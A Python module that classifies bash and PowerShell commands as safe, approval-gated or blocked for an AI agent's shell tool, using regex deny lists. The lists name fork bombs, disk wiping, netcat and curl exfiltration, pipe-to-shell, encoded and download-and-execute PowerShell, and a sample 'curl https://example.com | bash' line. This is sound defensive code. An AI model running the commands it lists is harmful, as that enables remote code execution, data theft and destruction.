"""bash_security.py — AST-level bash command risk analysis.

S7-A: Provides ``BashRiskLevel`` and ``analyze_bash_command()`` so that the
``bash()`` tool can make a structured, token-by-token decision about whether a
command should be blocked, approval-gated, or allowed directly — instead of
relying solely on TIER3_PREFIXES prefix matching.

The existing ``is_tier3()`` check in ``_approval.py`` is kept as a fast
pre-filter; this module is the authoritative secondary gate.

P4-3: Token-level bypass closures added in vol16:
- Environment-variable prefix + shell invocation (``BASH_ENV=x bash -l``)
- Absolute-path shell invocation with ``-c`` flag (``/bin/sh -c …``)
- ``eval`` / ``exec`` chaining (caught by downstream pattern propagation)

Usage::

    from src.tools.bash_security import analyze_bash_command, BashRiskLevel

    level, reasons = analyze_bash_command("curl https://example.com | bash")
    if level == BashRiskLevel.BLOCKED:
        return {"status": "error", "error": "Command blocked: " + ", ".join(reasons)}
"""

from __future__ import annotations

import re
import shlex
from enum import Enum
from functools import lru_cache
from typing import List, Tuple


# SEC-2: Internal cache type uses immutable tuple for reasons so lru_cache
# cannot be corrupted by callers mutating the returned list.
_CacheResult = Tuple["BashRiskLevel", Tuple[str, ...]]


class BashRiskLevel(str, Enum):
    """Risk classification for a shell command."""

    SAFE = "safe"  # Read-only or benign write to local workspace
    WORKSPACE_WRITE = "workspace_write"  # Writes to local workspace (non-destructive)
    DANGEROUS = "dangerous"  # Requires user approval (tier-3 gate)
    BLOCKED = "blocked"  # Hard-blocked; never execute


# ---------------------------------------------------------------------------
# Pattern sets
# ---------------------------------------------------------------------------

# Commands that always get BLOCKED regardless of context.
_BLOCKED_PATTERNS: List[Tuple[re.Pattern, str]] = [
    # Command substitution / process substitution (injection vector)
    (re.compile(r"\$\("), "command substitution $()"),
    (re.compile(r"`[^`]+`"), "backtick command substitution"),
    (re.compile(r"<\("), "process substitution <()"),
    (re.compile(r">\("), "process substitution >()"),
    # Pipe to interactive shell (classic injection: curl | bash)
    (re.compile(r"\|\s*(bash|sh|zsh|ksh|fish|dash)\b"), "pipe to shell"),
    # Destructive disk operations
    (re.compile(r"\bdd\b"), "dd (disk dump)"),
    (re.compile(r"\bmkfs\b"), "mkfs (format filesystem)"),
    (re.compile(r"\bfdisk\b"), "fdisk (partition editor)"),
    (re.compile(r"\bshred\b"), "shred (secure delete)"),
    (re.compile(r"\bwipefs\b"), "wipefs (wipe filesystem signatures)"),
    # Fork bomb
    (re.compile(r":\(\)\{.*:\|:"), "fork bomb pattern"),
    # Null device wipe
    (re.compile(r"\bdd\b.*if=/dev/"), "dd from device"),
    # P4-3: Absolute-path shell invocation with -c flag (e.g. /bin/sh -c '...', /usr/bin/bash -c)
    (
        re.compile(r"/(bin|usr/bin)/(bash|sh|zsh|ksh|fish|dash)\s.*-c\b"),
        "absolute-path shell with -c",
    ),
    # P4-3: Environment variable prefix + shell invocation (e.g. BASH_ENV=/tmp/x bash -l)
    (
        re.compile(r"^\w+=\S*\s+(bash|sh|zsh|ksh|fish|dash)\b"),
        "env-var prefix shell invocation",
    ),
]

# Commands that are DANGEROUS (require approval gate).
_DANGEROUS_PATTERNS: List[Tuple[re.Pattern, str]] = [
    # Privilege escalation
    (re.compile(r"\bsudo\b"), "sudo (privilege escalation)"),
    (re.compile(r"\bsu\b(\s|$)"), "su (user switch)"),
    (re.compile(r"\bdoas\b"), "doas (privilege escalation)"),
    # Network exfiltration / fetch
    (re.compile(r"\bcurl\b"), "curl (network access)"),
    (re.compile(r"\bwget\b"), "wget (network access)"),
    (re.compile(r"\bnc\b|\bnetcat\b"), "netcat (network access)"),
    # Package installation
    (re.compile(r"\bpip\d*\s+install\b"), "pip install"),
    (re.compile(r"\bnpm\s+(install|i)\b"), "npm install"),
    (re.compile(r"\bcargo\s+install\b"), "cargo install"),
    (re.compile(r"\bgo\s+(install|get)\b"), "go install/get"),
    (
        re.compile(r"\bapt(-get)?\s+(install|remove|purge|upgrade)\b"),
        "apt package management",
    ),
    (re.compile(r"\byum\s+(install|remove|update)\b"), "yum package management"),
    (re.compile(r"\bdnf\s+(install|remove|update)\b"), "dnf package management"),
    (re.compile(r"\bbrew\s+(install|uninstall|upgrade)\b"), "brew package management"),
    # Recursive file removal
    (re.compile(r"\brm\s+(-\S*r|-r\S*)\b"), "recursive rm"),
    (re.compile(r"\brmdir\b"), "rmdir"),
    # chmod / chown
    (re.compile(r"\bchmod\b"), "chmod (permission change)"),
    (re.compile(r"\bchown\b"), "chown (ownership change)"),
    # Environment manipulation
    (re.compile(r"\benv\s+-i\b"), "env -i (clear environment)"),
    # SSH / remote commands
    (re.compile(r"\bssh\b"), "ssh (remote shell)"),
    (re.compile(r"\brsync\b"), "rsync (remote sync)"),
    (re.compile(r"\bscp\b"), "scp (remote copy)"),
    # System management
    (re.compile(r"\bsystemctl\b"), "systemctl (service management)"),
    (re.compile(r"\bkill(all)?\b"), "kill (process termination)"),
    (re.compile(r"\bpkill\b"), "pkill (process termination)"),
    (re.compile(r"\bservice\b"), "service (system service)"),
    (re.compile(r"\bcrontab\b"), "crontab (scheduled tasks)"),
]


@lru_cache(maxsize=256)
def _analyze_bash_command_cached(cmd: str) -> _CacheResult:
    """Internal cached implementation — returns immutable tuple of reasons.

    SEC-2: Returns ``Tuple[BashRiskLevel, Tuple[str, ...]]`` so the lru_cache
    stores only immutable values; callers cannot corrupt the cache by mutating
    the reasons collection.
    """
    reasons: List[str] = []

    # Attempt tokenization for canonical form
    try:
        tokens = shlex.split(cmd)
        canonical = " ".join(tokens)
    except ValueError:
        # Malformed command (e.g. unmatched quotes) — treat as DANGEROUS
        return BashRiskLevel.DANGEROUS, ("malformed command (unmatched quotes)",)

    # Pass 1 — BLOCKED patterns (check against full canonical string)
    for pattern, reason in _BLOCKED_PATTERNS:
        if pattern.search(canonical) or pattern.search(cmd):
            return BashRiskLevel.BLOCKED, (reason,)

    # Pass 2 — DANGEROUS patterns
    for pattern, reason in _DANGEROUS_PATTERNS:
        if pattern.search(canonical) or pattern.search(cmd):
            reasons.append(reason)

    if reasons:
        return BashRiskLevel.DANGEROUS, tuple(reasons)

    return BashRiskLevel.SAFE, ()


def analyze_bash_command(cmd: str) -> Tuple[BashRiskLevel, List[str]]:
    """Analyse *cmd* and return ``(risk_level, reasons)``.

    The function works in three passes:
    1. Tokenize with ``shlex.split()`` to normalise whitespace and quoting.
       Falls back to raw string analysis when the command cannot be parsed
       (e.g. contains unclosed quotes — treated as DANGEROUS by default).
    2. Check BLOCKED patterns first; return immediately on first match.
    3. Check DANGEROUS patterns; collect all matches and return DANGEROUS if any.

    Returns ``(SAFE, [])`` when no patterns match.

    SEC-2: Internally delegates to ``_analyze_bash_command_cached`` which stores
    immutable tuples; this public wrapper converts reasons back to a fresh list
    so callers receive an independent mutable copy they can safely modify.
    """
    level, reasons_tuple = _analyze_bash_command_cached(cmd)
    return level, list(reasons_tuple)


def is_blocked(cmd: str) -> bool:
    """Convenience: return True if *cmd* must be hard-blocked."""
    level, _ = analyze_bash_command(cmd)
    return level == BashRiskLevel.BLOCKED


def is_dangerous(cmd: str) -> bool:
    """Convenience: return True if *cmd* requires approval."""
    level, _ = analyze_bash_command(cmd)
    return level in (BashRiskLevel.DANGEROUS, BashRiskLevel.BLOCKED)


# ---------------------------------------------------------------------------
# PowerShell security analysis (G11)
# ---------------------------------------------------------------------------

# PowerShell commands / patterns that must always be BLOCKED.
_PS_BLOCKED_PATTERNS: List[Tuple[re.Pattern, str]] = [
    # Dynamic execution — equivalent of eval/exec in bash
    (re.compile(r"\bInvoke-Expression\b", re.I), "Invoke-Expression (dynamic exec)"),
    (re.compile(r"\biex\b", re.I), "iex (Invoke-Expression alias)"),
    (re.compile(r"\b&\s*\(", re.I), "call operator with expression &(…)"),
    # Download and execute
    (
        re.compile(r"\bInvoke-WebRequest\b.*\|\s*(iex|Invoke-Expression)\b", re.I),
        "download-and-exec via Invoke-WebRequest",
    ),
    (
        re.compile(r"\bStart-BitsTransfer\b.*\|\s*(iex|Invoke-Expression)\b", re.I),
        "download-and-exec via Start-BitsTransfer",
    ),
    # Encoded command (common obfuscation vector)
    (re.compile(r"-Enc(odedCommand)?\b", re.I), "encoded command (-EncodedCommand)"),
    # Pipe to PowerShell itself
    (re.compile(r"\|\s*powershell\b", re.I), "pipe to powershell"),
    # Bypass execution policy
    (
        re.compile(r"-ExecutionPolicy\s+Bypass\b", re.I),
        "execution policy bypass",
    ),
    # Disk/format operations
    (re.compile(r"\bFormat-Volume\b", re.I), "Format-Volume (destructive)"),
    (re.compile(r"\bClear-Disk\b", re.I), "Clear-Disk (destructive)"),
    # .NET reflection-based exec
    (
        re.compile(r"\[System\.Reflection\b", re.I),
        "reflection-based dynamic exec",
    ),
]

# PowerShell commands that are DANGEROUS (require approval).
_PS_DANGEROUS_PATTERNS: List[Tuple[re.Pattern, str]] = [
    # Privilege elevation
    (re.compile(r"\bStart-Process\b.*-Verb\s+RunAs\b", re.I), "RunAs (UAC elevation)"),
    # Remote / network
    (re.compile(r"\bInvoke-WebRequest\b", re.I), "Invoke-WebRequest (network)"),
    (re.compile(r"\bInvoke-RestMethod\b", re.I), "Invoke-RestMethod (network)"),
    (re.compile(r"\bStart-BitsTransfer\b", re.I), "Start-BitsTransfer (network)"),
    (re.compile(r"\bNew-PSSession\b", re.I), "New-PSSession (remote shell)"),
    (re.compile(r"\bEnter-PSSession\b", re.I), "Enter-PSSession (remote shell)"),
    (re.compile(r"\bInvoke-Command\b.*-ComputerName\b", re.I), "Invoke-Command remote"),
    # Recursive / forced deletion
    (
        re.compile(r"\bRemove-Item\b.*(-Recurse|-Force)\b", re.I),
        "Remove-Item -Recurse/-Force",
    ),
    (re.compile(r"\brd\b.*\/s\b", re.I), "rd /s (recursive delete, cmd.exe compat)"),
    # Service / scheduled task management
    (re.compile(r"\bNew-Service\b|\bSet-Service\b|\bRemove-Service\b", re.I), "service management"),
    (
        re.compile(r"\bRegister-ScheduledTask\b|\bUnregister-ScheduledTask\b", re.I),
        "scheduled task management",
    ),
    # Registry writes
    (re.compile(r"\bSet-ItemProperty\b.*HKLM:\b", re.I), "HKLM registry write"),
    (re.compile(r"\bNew-Item\b.*HKLM:\b", re.I), "HKLM registry write"),
    # Package installation
    (re.compile(r"\bInstall-Package\b|\bInstall-Module\b", re.I), "package installation"),
    (re.compile(r"\bwinget\s+install\b", re.I), "winget install"),
    (re.compile(r"\bchoco\s+install\b", re.I), "choco install"),
    # ACL / permission changes
    (re.compile(r"\bSet-Acl\b", re.I), "Set-Acl (permission change)"),
    # Process termination
    (re.compile(r"\bStop-Process\b|\bKill\b", re.I), "Stop-Process/Kill"),
]


@lru_cache(maxsize=256)
def _analyze_powershell_command_cached(cmd: str) -> _CacheResult:
    """Cached PowerShell risk analysis. Returns immutable (level, reasons) tuple."""
    reasons: List[str] = []

    # Pass 1 — BLOCKED
    for pattern, reason in _PS_BLOCKED_PATTERNS:
        if pattern.search(cmd):
            return BashRiskLevel.BLOCKED, (reason,)

    # Pass 2 — DANGEROUS
    for pattern, reason in _PS_DANGEROUS_PATTERNS:
        if pattern.search(cmd):
            reasons.append(reason)

    if reasons:
        return BashRiskLevel.DANGEROUS, tuple(reasons)

    return BashRiskLevel.SAFE, ()


def analyze_powershell_command(cmd: str) -> Tuple[BashRiskLevel, List[str]]:
    """Analyse a PowerShell command string and return ``(risk_level, reasons)``.

    Mirrors ``analyze_bash_command`` but uses PowerShell-aware patterns (G11):
    - Blocked: Invoke-Expression / iex, encoded commands, download-and-exec,
      execution policy bypass, destructive disk ops, reflection-based exec.
    - Dangerous: network cmdlets, remote sessions, Remove-Item -Recurse,
      service / scheduled-task / registry management, package managers.

    Note: ``shlex.split`` is not used here as PowerShell quoting rules differ
    from POSIX; pattern matching is applied directly against the raw string.
    """
    level, reasons_tuple = _analyze_powershell_command_cached(cmd)
    return level, list(reasons_tuple)


def analyze_command(cmd: str, shell: str = "bash") -> Tuple[BashRiskLevel, List[str]]:
    """Dispatcher: route to the appropriate analyser based on *shell*.

    Args:
        cmd:   The command string to analyse.
        shell: One of ``"bash"`` (default, covers sh/zsh/fish), ``"powershell"``
               or ``"pwsh"``.

    Returns:
        ``(BashRiskLevel, [reason, …])`` — same contract as the per-shell functions.
    """
    if shell.lower() in ("powershell", "pwsh"):
        return analyze_powershell_command(cmd)
    return analyze_bash_command(cmd)
